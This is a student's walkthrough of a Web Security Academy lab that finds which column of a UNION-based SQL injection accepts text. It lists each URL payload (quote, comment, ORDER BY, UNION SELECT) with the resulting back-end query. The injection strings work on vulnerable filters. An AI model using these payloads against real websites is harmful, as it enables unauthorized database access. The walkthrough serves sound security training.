# Lab: SQL injection UNION attack, finding a column containing text

- sqli: product category filter
- end goal: determine which columns are compatible with string data

### Analysis
- url: `https://0a11008d03b0377784e4dcdf00640037.web-security-academy.net/`

- front-end: `/filter?category=Lifestyle`
- back-end:
```sql
select * from products where category = 'Lifestyle' and released = 1
```

- check sqli vulnerability
- front-end: `/filter?category=Lifestyle'`
- back-end:
```sql
select * from products where category = 'Lifestyle'' and released = 1
'-- 500 Internal Server Error 
```

- front-end: `/filter?category=Lifestyle'--`
- back-end:
```sql
select * from products where category = 'Lifestyle'--' and released = 1
-- 200 OK: this website have a sqli vulnerability
```

- determine how many columns
- front-end: `/filter?category=Lifestyle' order by 3--`
- back-end:
```sql
select * from products where category = 'Lifestyle' order by 3--' and released = 1
-- 200 OK: this website have 3 columns
```

- determine how many strings which contain in columns
- front-end: `/filter?category=Lifestyle' union select 'text', null, null--`
- back-end:
```sql
select * from products where category = 'Lifestyle' union select 'text', null, null--' and released = 1
-- 500 Internal Server Error 
```
- you should change the position of text untill you see 200 OK like this
- front-end: `/filter?category=Lifestyle' union select null, 'text', null--`
- back-end:
```sql
select * from products where category = 'Lifestyle' union select null, 'text', null--' and released = 1
-- 200 OK: second column is a type of string
```
- you gonna see this message: `Make the database retrieve the string: 'd6KqGR'`
- chage `text` by useing this keyword `d6KqGR`
- front-end: `/filter?category=Lifestyle' union select null, 'd6KqGR', null--`
- back-end:
```sql
select * from products where category = 'Lifestyle' union select null, 'd6KqGR', null--' and released = 1
-- 200 OK: Congratulations, you solved the lab!
```

---